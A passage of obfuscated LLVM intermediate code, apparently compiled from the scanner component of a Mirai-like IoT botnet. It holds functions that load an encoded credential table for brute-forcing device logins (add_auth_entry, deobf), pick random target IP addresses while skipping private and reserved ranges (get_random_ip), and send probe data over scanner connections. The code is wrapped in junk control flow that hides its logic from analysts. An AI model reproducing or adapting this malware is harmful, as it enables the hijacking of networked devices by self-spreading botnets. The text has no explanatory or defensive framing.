  %1891 = load i8*, i8** %42, align 8
  %1892 = load i32, i32* %43, align 4
  %1893 = sext i32 %1892 to i64
  %1894 = call i64 @send(i32 %1890, i8* %1891, i64 %1893, i32 16384)
  %1895 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1896 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1895, i32 0, i32 1
  %1897 = load i32, i32* %1896, align 8
  %1898 = call i64 @send(i32 %1897, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %1899 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1900 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1899, i32 0, i32 3
  store i32 10, i32* %1900, align 8
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1464
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1499
  %1901 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1902 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1901, i32 0, i32 8
  store i8 0, i8* %1902, align 8
  %1903 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1904 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1903, i32 0, i32 3
  store i32 0, i32* %1904, align 8
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1544
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1561
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1612
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %1632
  %1905 = load i32, i32* %1, align 4
  %_259 = sub i32 %1905, 1
  %gen260 = mul i32 %_259, 1
  %_261 = shl i32 %1905, 1
  %1906 = add nsw i32 %1905, 1
  store i32 %1906, i32* %1, align 4
  br label %originalBB258

originalBB265alteredBB:                           ; preds = %originalBB265, %1651
  br label %originalBB265
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = load i32, i32* @x.55
  %5 = load i32, i32* @y.56
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  store i16 %2, i16* %14, align 2
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = bitcast %struct.scanner_auth* %16 to i8*
  %18 = load i32, i32* @auth_table_len, align 4
  %19 = add nsw i32 %18, 1
  %20 = sext i32 %19 to i64
  %21 = mul i64 %20, 24
  %22 = call i8* @realloc(i8* %17, i64 %21) #6
  %23 = bitcast i8* %22 to %struct.scanner_auth*
  store %struct.scanner_auth* %23, %struct.scanner_auth** @auth_table, align 8
  %24 = load i8*, i8** %12, align 8
  %25 = call i8* @deobf(i8* %24, i32* %15)
  %26 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %27 = load i32, i32* @auth_table_len, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %26, i64 %28
  %30 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i32 0, i32 0
  store i8* %25, i8** %30, align 8
  %31 = load i32, i32* %15, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %34 = load i32, i32* @auth_table_len, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %33, i64 %35
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i32 0, i32 4
  store i8 %32, i8* %37, align 4
  %38 = load i8*, i8** %13, align 8
  %39 = call i8* @deobf(i8* %38, i32* %15)
  %40 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %41 = load i32, i32* @auth_table_len, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %40, i64 %42
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %43, i32 0, i32 1
  store i8* %39, i8** %44, align 8
  %45 = load i32, i32* %15, align 4
  %46 = trunc i32 %45 to i8
  %47 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %48 = load i32, i32* @auth_table_len, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %47, i64 %49
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %50, i32 0, i32 5
  store i8 %46, i8* %51, align 1
  %52 = load i16, i16* @auth_table_max_weight, align 2
  %53 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %54 = load i32, i32* @auth_table_len, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %53, i64 %55
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 2
  store i16 %52, i16* %57, align 8
  %58 = load i16, i16* @auth_table_max_weight, align 2
  %59 = zext i16 %58 to i32
  %60 = load i16, i16* %14, align 2
  %61 = zext i16 %60 to i32
  %62 = add nsw i32 %59, %61
  %63 = trunc i32 %62 to i16
  %64 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %65 = load i32, i32* @auth_table_len, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* @auth_table_len, align 4
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %64, i64 %67
  %69 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %68, i32 0, i32 3
  store i16 %63, i16* %69, align 2
  %70 = load i16, i16* %14, align 2
  %71 = zext i16 %70 to i32
  %72 = load i16, i16* @auth_table_max_weight, align 2
  %73 = zext i16 %72 to i32
  %74 = add nsw i32 %73, %71
  %75 = trunc i32 %74 to i16
  store i16 %75, i16* @auth_table_max_weight, align 2
  %76 = load i32, i32* @x.55
  %77 = load i32, i32* @y.56
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %84 = alloca i8*, align 8
  %85 = alloca i8*, align 8
  %86 = alloca i16, align 2
  %87 = alloca i32, align 4
  store i8* %0, i8** %84, align 8
  store i8* %1, i8** %85, align 8
  store i16 %2, i16* %86, align 2
  %88 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %89 = bitcast %struct.scanner_auth* %88 to i8*
  %90 = load i32, i32* @auth_table_len, align 4
  %91 = add nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %_ = shl i64 %92, 24
  %_1 = shl i64 %92, 24
  %_2 = sub i64 %92, 24
  %gen = mul i64 %_2, 24
  %_3 = shl i64 %92, 24
  %_4 = sub i64 %92, 24
  %gen5 = mul i64 %_4, 24
  %_6 = shl i64 %92, 24
  %_7 = shl i64 %92, 24
  %93 = mul i64 %92, 24
  %94 = call i8* @realloc(i8* %89, i64 %93) #6
  %95 = bitcast i8* %94 to %struct.scanner_auth*
  store %struct.scanner_auth* %95, %struct.scanner_auth** @auth_table, align 8
  %96 = load i8*, i8** %84, align 8
  %97 = call i8* @deobf(i8* %96, i32* %87)
  %98 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %99 = load i32, i32* @auth_table_len, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %98, i64 %100
  %102 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %101, i32 0, i32 0
  store i8* %97, i8** %102, align 8
  %103 = load i32, i32* %87, align 4
  %104 = trunc i32 %103 to i8
  %105 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %106 = load i32, i32* @auth_table_len, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %105, i64 %107
  %109 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %108, i32 0, i32 4
  store i8 %104, i8* %109, align 4
  %110 = load i8*, i8** %85, align 8
  %111 = call i8* @deobf(i8* %110, i32* %87)
  %112 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %113 = load i32, i32* @auth_table_len, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %112, i64 %114
  %116 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %115, i32 0, i32 1
  store i8* %111, i8** %116, align 8
  %117 = load i32, i32* %87, align 4
  %118 = trunc i32 %117 to i8
  %119 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %120 = load i32, i32* @auth_table_len, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %119, i64 %121
  %123 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %122, i32 0, i32 5
  store i8 %118, i8* %123, align 1
  %124 = load i16, i16* @auth_table_max_weight, align 2
  %125 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %126 = load i32, i32* @auth_table_len, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %125, i64 %127
  %129 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %128, i32 0, i32 2
  store i16 %124, i16* %129, align 8
  %130 = load i16, i16* @auth_table_max_weight, align 2
  %131 = zext i16 %130 to i32
  %132 = load i16, i16* %86, align 2
  %133 = zext i16 %132 to i32
  %_8 = sub i32 %131, %133
  %gen9 = mul i32 %_8, %133
  %134 = add nsw i32 %131, %133
  %135 = trunc i32 %134 to i16
  %136 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %137 = load i32, i32* @auth_table_len, align 4
  %_10 = sub i32 0, %137
  %gen11 = add i32 %_10, 1
  %_12 = shl i32 %137, 1
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* @auth_table_len, align 4
  %139 = sext i32 %137 to i64
  %140 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %136, i64 %139
  %141 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %140, i32 0, i32 3
  store i16 %135, i16* %141, align 2
  %142 = load i16, i16* %86, align 2
  %143 = zext i16 %142 to i32
  %144 = load i16, i16* @auth_table_max_weight, align 2
  %145 = zext i16 %144 to i32
  %_13 = sub i32 %145, %143
  %gen14 = mul i32 %_13, %143
  %_15 = shl i32 %145, %143
  %_16 = sub i32 %145, %143
  %gen17 = mul i32 %_16, %143
  %_18 = sub i32 %145, %143
  %gen19 = mul i32 %_18, %143
  %_20 = sub i32 %145, %143
  %gen21 = mul i32 %_20, %143
  %146 = add nsw i32 %145, %143
  %147 = trunc i32 %146 to i16
  store i16 %147, i16* @auth_table_max_weight, align 2
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = load i32, i32* @x.57
  %2 = load i32, i32* @y.58
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = load i32, i32* @x.57
  %15 = load i32, i32* @y.58
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %481, %originalBBpart2
  %23 = call i32 @rand_next()
  store i32 %23, i32* %9, align 4
  %24 = load i32, i32* %9, align 4
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %10, align 1
  %27 = load i32, i32* %9, align 4
  %28 = lshr i32 %27, 8
  %29 = and i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* %11, align 1
  %31 = load i32, i32* %9, align 4
  %32 = lshr i32 %31, 16
  %33 = and i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i32, i32* %9, align 4
  %36 = lshr i32 %35, 24
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %13, align 1
  br label %39

; <label>:39:                                     ; preds = %22
  %40 = load i32, i32* @x.57
  %41 = load i32, i32* @y.58
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load i8, i8* %10, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 127
  %51 = load i32, i32* @x.57
  %52 = load i32, i32* @y.58
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %50, label %481, label %59

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load i8, i8* %10, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %481, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* %10, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 3
  br i1 %66, label %481, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* %10, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 15
  br i1 %70, label %481, label %71

; <label>:71:                                     ; preds = %67
  %72 = load i32, i32* @x.57
  %73 = load i32, i32* @y.58
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i8, i8* %10, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 16
  %83 = load i32, i32* @x.57
  %84 = load i32, i32* @y.58
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %82, label %481, label %91

; <label>:91:                                     ; preds = %originalBBpart28
  %92 = load i32, i32* @x.57
  %93 = load i32, i32* @y.58
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %91
  %100 = load i8, i8* %10, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 56
  %103 = load i32, i32* @x.57
  %104 = load i32, i32* @y.58
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %102, label %481, label %111

; <label>:111:                                    ; preds = %originalBBpart212
  %112 = load i8, i8* %10, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 10
  br i1 %114, label %481, label %115

; <label>:115:                                    ; preds = %111
  %116 = load i8, i8* %10, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 192
  br i1 %118, label %119, label %139

; <label>:119:                                    ; preds = %115
  %120 = load i32, i32* @x.57
  %121 = load i32, i32* @y.58
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %119
  %128 = load i8, i8* %11, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 168
  %131 = load i32, i32* @x.57
  %132 = load i32, i32* @y.58
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %130, label %481, label %139

; <label>:139:                                    ; preds = %originalBBpart216, %115
  %140 = load i8, i8* %10, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 172
  br i1 %142, label %143, label %151

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* %11, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp sge i32 %145, 16
  br i1 %146, label %147, label %151

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* %11, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %149, 32
  br i1 %150, label %481, label %151

; <label>:151:                                    ; preds = %147, %143, %139
  %152 = load i32, i32* @x.57
  %153 = load i32, i32* @y.58
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %151
  %160 = load i8, i8* %10, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 100
  %163 = load i32, i32* @x.57
  %164 = load i32, i32* @y.58
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %162, label %171, label %179

; <label>:171:                                    ; preds = %originalBBpart220
  %172 = load i8, i8* %11, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp sge i32 %173, 64
  br i1 %174, label %175, label %179

; <label>:175:                                    ; preds = %171
  %176 = load i8, i8* %11, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp slt i32 %177, 127
  br i1 %178, label %481, label %179

; <label>:179:                                    ; preds = %175, %171, %originalBBpart220
  %180 = load i32, i32* @x.57
  %181 = load i32, i32* @y.58
  %182 = sub i32 %180, 1
  %183 = mul i32 %180, %182
  %184 = urem i32 %183, 2
  %185 = icmp eq i32 %184, 0
  %186 = icmp slt i32 %181, 10
  %187 = or i1 %185, %186
  br i1 %187, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %179
  %188 = load i8, i8* %10, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 169
  %191 = load i32, i32* @x.57
  %192 = load i32, i32* @y.58
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %190, label %199, label %219

; <label>:199:                                    ; preds = %originalBBpart224
  %200 = load i32, i32* @x.57
  %201 = load i32, i32* @y.58
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %199
  %208 = load i8, i8* %11, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp sgt i32 %209, 254
  %211 = load i32, i32* @x.57
  %212 = load i32, i32* @y.58
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %210, label %481, label %219

; <label>:219:                                    ; preds = %originalBBpart228, %originalBBpart224
  %220 = load i32, i32* @x.57
  %221 = load i32, i32* @y.58
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %219
  %228 = load i8, i8* %10, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 198
  %231 = load i32, i32* @x.57
  %232 = load i32, i32* @y.58
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %230, label %239, label %263

; <label>:239:                                    ; preds = %originalBBpart232
  %240 = load i8, i8* %11, align 1
  %241 = zext i8 %240 to i32
  %242 = icmp sge i32 %241, 18
  br i1 %242, label %243, label %263

; <label>:243:                                    ; preds = %239
  %244 = load i32, i32* @x.57
  %245 = load i32, i32* @y.58
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %243
  %252 = load i8, i8* %11, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp slt i32 %253, 20
  %255 = load i32, i32* @x.57
  %256 = load i32, i32* @y.58
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %254, label %481, label %263

; <label>:263:                                    ; preds = %originalBBpart236, %239, %originalBBpart232
  %264 = load i8, i8* %10, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp sge i32 %265, 224
  br i1 %266, label %481, label %267

; <label>:267:                                    ; preds = %263
  %268 = load i8, i8* %10, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 106
  br i1 %270, label %271, label %275

; <label>:271:                                    ; preds = %267
  %272 = load i8, i8* %11, align 1
  %273 = zext i8 %272 to i32
  %274 = icmp eq i32 %273, 186
  br i1 %274, label %481, label %275

; <label>:275:                                    ; preds = %271, %267
  %276 = load i8, i8* %10, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 106
  br i1 %278, label %279, label %283

; <label>:279:                                    ; preds = %275
  %280 = load i8, i8* %11, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 187
  br i1 %282, label %481, label %283

; <label>:283:                                    ; preds = %279, %275
  %284 = load i32, i32* @x.57
  %285 = load i32, i32* @y.58
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %283
  %292 = load i8, i8* %10, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp eq i32 %293, 106
  %295 = load i32, i32* @x.57
  %296 = load i32, i32* @y.58
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %294, label %303, label %307

; <label>:303:                                    ; preds = %originalBBpart240
  %304 = load i8, i8* %11, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp eq i32 %305, 185
  br i1 %306, label %481, label %307

; <label>:307:                                    ; preds = %303, %originalBBpart240
  %308 = load i32, i32* @x.57
  %309 = load i32, i32* @y.58
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %307
  %316 = load i8, i8* %10, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp eq i32 %317, 106
  %319 = load i32, i32* @x.57
  %320 = load i32, i32* @y.58
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %318, label %327, label %331

; <label>:327:                                    ; preds = %originalBBpart244
  %328 = load i8, i8* %11, align 1
  %329 = zext i8 %328 to i32
  %330 = icmp eq i32 %329, 184
  br i1 %330, label %481, label %331

; <label>:331:                                    ; preds = %327, %originalBBpart244
  %332 = load i8, i8* %10, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp eq i32 %333, 150
  br i1 %334, label %335, label %355

; <label>:335:                                    ; preds = %331
  %336 = load i32, i32* @x.57
  %337 = load i32, i32* @y.58
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %335
  %344 = load i8, i8* %11, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp eq i32 %345, 31
  %347 = load i32, i32* @x.57
  %348 = load i32, i32* @y.58
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %346, label %481, label %355

; <label>:355:                                    ; preds = %originalBBpart248, %331
  %356 = load i8, i8* %10, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp eq i32 %357, 49
  br i1 %358, label %359, label %363

; <label>:359:                                    ; preds = %355
  %360 = load i8, i8* %11, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 51
  br i1 %362, label %481, label %363

; <label>:363:                                    ; preds = %359, %355
  %364 = load i8, i8* %10, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 178
  br i1 %366, label %367, label %387

; <label>:367:                                    ; preds = %363
  %368 = load i32, i32* @x.57
  %369 = load i32, i32* @y.58
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %367
  %376 = load i8, i8* %11, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp eq i32 %377, 62
  %379 = load i32, i32* @x.57
  %380 = load i32, i32* @y.58
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
